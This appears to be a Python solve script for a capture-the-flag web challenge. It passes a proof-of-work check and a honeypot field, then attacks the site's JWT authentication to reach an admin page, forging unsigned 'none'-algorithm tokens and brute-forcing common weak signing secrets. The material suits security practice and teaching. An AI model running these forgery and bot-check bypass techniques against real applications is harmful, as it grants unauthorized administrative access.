import requests
import hashlib
import json
import base64
from bs4 import BeautifulSoup

url = "https://admin-panel-ctf.onrender.com"

print("="*70)
print("ADMIN PANEL CTF - FINAL SOLUTION")
print("="*70)

def sha256(text):
    """Calculate SHA-256 hash"""
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow(challenge):
    """Solve proof-of-work challenge"""
    print(f"[*] Solving PoW challenge: {challenge}")
    nonce = 0
    while True:
        hash_result = sha256(challenge + str(nonce))
        if hash_result.startswith("0000"):
            print(f"[+] Found nonce: {nonce} (hash: {hash_result})")
            return nonce
        nonce += 1
        if nonce % 10000 == 0:
            print(f"  Trying nonce {nonce}...")

# Create a new session
session = requests.Session()

# Step 1: Get PoW challenge
print("\n[*] Getting PoW challenge...")
r = session.get(f"{url}/pow-challenge")
if r.status_code == 200:
    challenge_data = r.json()
    challenge = challenge_data.get('challenge')
    print(f"[+] Challenge: {challenge}")
    
    # Solve PoW
    nonce = solve_pow(challenge)
    
    # Step 2: Register with all required fields
    print("\n[*] Registering user...")
    register_data = {
        'username': 'hacker888',
        'password': 'SecurePass123!',
        'display_name': 'Hacker User',
        'website': '',  # Honeypot - leave empty
        'pow_nonce': str(nonce),
        'challenge': challenge
    }
    
    r = session.post(f"{url}/register", data=register_data, allow_redirects=False)
    print(f"Status: {r.status_code}")
    
    if r.status_code == 302:
        print(f"[+] Redirect to: {r.headers.get('Location')}")
    
    print(f"Response: {r.text[:500]}")
    
    # Step 3: Login
    print("\n[*] Logging in...")
    login_data = {
        'username': 'hacker888',
        'password': 'SecurePass123!'
    }
    
    r = session.post(f"{url}/login", data=login_data, allow_redirects=False)
    print(f"Status: {r.status_code}")
    
    if r.status_code == 302:
        print(f"[+] Redirect to: {r.headers.get('Location')}")
    
    # Check cookies
    print(f"[+] Cookies: {session.cookies.get_dict()}")
    
    try:
        response_json = r.json()
        print(f"[+] Response JSON: {response_json}")
        
        if 'token' in response_json:
            token = response_json['token']
            print(f"[+] Got JWT token!")
            
            # Decode JWT
            print("\n[*] Decoding JWT...")
            parts = token.split('.')
            if len(parts) == 3:
                header = base64.urlsafe_b64decode(parts[0] + '==').decode()
                payload = base64.urlsafe_b64decode(parts[1] + '==').decode()
                
                print(f"Header: {header}")
                print(f"Payload: {payload}")
                
                payload_json = json.loads(payload)
                print(f"\n[*] User info:")
                for key, value in payload_json.items():
                    print(f"  {key}: {value}")
                
                # Set cookie
                session.cookies.set('token', token)
                
                # Access dashboard
                print("\n[*] Accessing dashboard...")
                r = session.get(f"{url}/dashboard")
                print(f"Status: {r.status_code}")
                
                if 'flag' in r.text.lower() or 'FLAG' in r.text:
                    print("[!!!] FLAG FOUND IN DASHBOARD!")
                    print(r.text)
                
                # Try admin
                print("\n[*] Trying /admin...")
                r = session.get(f"{url}/admin")
                print(f"Status: {r.status_code}")
                
                if r.status_code == 200:
                    print("[!!!] ADMIN ACCESS!")
                    print(r.text)
                elif r.status_code == 403:
                    print("[-] Access denied. Need admin privileges.")
                    
                    # Try JWT manipulation
                    print("\n[*] Attempting JWT manipulation...")
                    
                    # Method 1: Try 'none' algorithm
                    print("\n[*] Method 1: Algorithm confusion (none)")
                    header_none = json.dumps({"alg": "none", "typ": "JWT"})
                    payload_admin = payload_json.copy()
                    payload_admin['is_admin'] = True
                    payload_str = json.dumps(payload_admin)
                    
                    # Create unsigned JWT
                    header_b64 = base64.urlsafe_b64encode(header_none.encode()).decode().rstrip('=')
                    payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
                    fake_token = f"{header_b64}.{payload_b64}."
                    
                    session.cookies.set('token', fake_token)
                    r = session.get(f"{url}/admin")
                    print(f"  Status: {r.status_code}")
                    if r.status_code == 200:
                        print("[!!!] SUCCESS WITH NONE ALGORITHM!")
                        print(r.text)
                    
                    # Method 2: Try modifying payload (if weak secret)
                    print("\n[*] Method 2: Trying common JWT secrets...")
                    import jwt as pyjwt
                    
                    common_secrets = ['secret', 'password', 'admin', '123456', 'key', 'jwt_secret', '']
                    
                    for secret in common_secrets:
                        try:
                            payload_admin = payload_json.copy()
                            payload_admin['is_admin'] = True
                            
                            forged_token = pyjwt.encode(payload_admin, secret, algorithm='HS256')
                            
                            session.cookies.set('token', forged_token)
                            r = session.get(f"{url}/admin")
                            
                            if r.status_code == 200:
                                print(f"[!!!] SUCCESS WITH SECRET: '{secret}'!")
                                print(r.text)
                                break
                        except:
                            pass
                
    except json.JSONDecodeError:
        print("Response is not JSON")
        print(r.text[:1000])
